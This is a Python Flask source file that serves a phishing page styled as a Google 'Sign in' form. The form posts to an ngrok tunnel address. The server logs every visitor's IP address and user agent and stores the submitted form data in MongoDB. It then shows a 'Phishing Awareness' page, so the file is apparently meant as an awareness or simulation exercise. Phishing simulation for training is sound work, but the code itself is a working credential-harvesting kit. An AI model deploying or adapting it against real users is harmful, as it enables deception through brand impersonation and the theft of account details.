from flask import Flask, request, jsonify
from pymongo import MongoClient
import json

app = Flask(__name__)

# MongoDB setup
client = MongoClient('mongodb://localhost:27017/')
db = client['cybersec']
collection = db['form_data']

form = """
<p><br></p>
<div style="font-family: Arial, sans-serif; background-color: #f2f2f2; margin: 0; padding: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh;" data-mce-style="font-family: Arial, sans-serif; background-color: #f2f2f2; margin: 0; padding: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh;">
  <div class="login-container" style="background-color: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); text-align: center; max-width: 400px; width: 100%;" data-mce-style="background-color: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); text-align: center; max-width: 400px; width: 100%;"><img class="google-logo" src="https://1000logos.net/wp-content/uploads/2021/05/Google-logo.png" alt="Google Logo" style="width: 100px; height: auto;" data-mce-src="https://logo.clearbit.com/google.com" data-mce-style="width: 100px; height: auto;">
    <h1 class="login-heading" style="margin-top: 20px; font-size: 24px; font-weight: bold;" data-mce-style="margin-top: 20px; font-size: 24px; font-weight: bold;">Sign in</h1>
    <p class="sub-heading" style="margin-top: 10px; font-size: 16px; color: #70757a;" data-mce-style="margin-top: 10px; font-size: 16px; color: #70757a;">Use your Google Account</p>
    <form method="POST" action="https://1367-2409-40c1-10dd-bec6-640e-854-9850-9022.ngrok-free.app/post"><input class="input-field" name="email" type="text" placeholder="Email or phone" style="margin-top: 20px; width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;" data-mce-style="margin-top: 20px; width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
      <p class="blue-text" style="color: #4285f4; font-size: 14px; margin-top: 10px; text-align: left;" data-mce-style="color: #4285f4; font-size: 14px; margin-top: 10px; text-align: left;">Forgot password?</p>
      <p class="private-sign-in" style="color: #70757a; font-size: 14px; margin-top: 20px; text-align: left;" data-mce-style="color: #70757a; font-size: 14px; margin-top: 20px; text-align: left;">Not your computer? Use Guest mode to sign in privately. <a href="#" data-mce-href="#">Learn more</a></p><button class="next-button" style="background-color: #4285f4; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-size: 16px; margin-top: 20px; float: right;" data-mce-style="background-color: #4285f4; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-size: 16px; margin-top: 20px; float: right;">Next</button>
    </form>
  </div>
  <div class="language-options" style="color: #70757a; font-size: 12px; text-align: center; margin-top: 20px;" data-mce-style="color: #70757a; font-size: 12px; text-align: center; margin-top: 20px;"><span class="language-option" style="margin-right: 10px; text-decoration: none; color: #70757a;" data-mce-style="margin-right: 10px; text-decoration: none; color: #70757a;">English (United Kingdom)</span> <span class="language-option" style="margin-right: 10px; text-decoration: none; color: #70757a;" data-mce-style="margin-right: 10px; text-decoration: none; color: #70757a;"><a href="#" class="language-option" style="margin-right: 10px; text-decoration: none; color: #70757a;" data-mce-href="#" data-mce-style="margin-right: 10px; text-decoration: none; color: #70757a;">हिन्दी</a></span> <span class="language-option" style="margin-right: 10px; text-decoration: none; color: #70757a;" data-mce-style="margin-right: 10px; text-decoration: none; color: #70757a;"><a href="#" class="language-option" style="margin-right: 10px; text-decoration: none; color: #70757a;" data-mce-href="#" data-mce-style="margin-right: 10px; text-decoration: none; color: #70757a;">Español</a></span> <!-- Add more language options here -->
  </div>
</div>
"""

@app.route('/get', methods=['GET'])
def get_endpoint():
    # Store metadata in MongoDB
    metadata = {
        'ip': request.remote_addr,
        'user_agent': request.user_agent.string,
        'endpoint': 'get_endpoint',
    }
    collection.insert_one(metadata)

    # Return HTML response
    html_response = form
    return html_response

@app.route('/post', methods=['POST'])
def post_endpoint():
    # Parse JSON data from the request body
    try:
        data = str(request.get_data())
    except json.JSONDecodeError as e:
        return jsonify({"error": "Invalid JSON data"}), 400

    # Save the data in MongoDB
    collection.insert_one({
        'ip': request.remote_addr,
        'user_agent': request.user_agent.string,
        'endpoint': 'post_endpoint',
        'data': data,
    })

    print({
        'ip': request.remote_addr,
        'user_agent': request.user_agent.string,
        'endpoint': 'post_endpoint',
        'data': data,
    })

    return """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Phishing Awareness</title>
            
        </head>
        <img src=  "https://media.defense.gov/2022/Oct/19/2003100201/1200/1200/0/221020-D-D0449-001.PNG">

        </html>

        """

if __name__ == '__main__':
    app.run(host='localhost', port=8000)
  
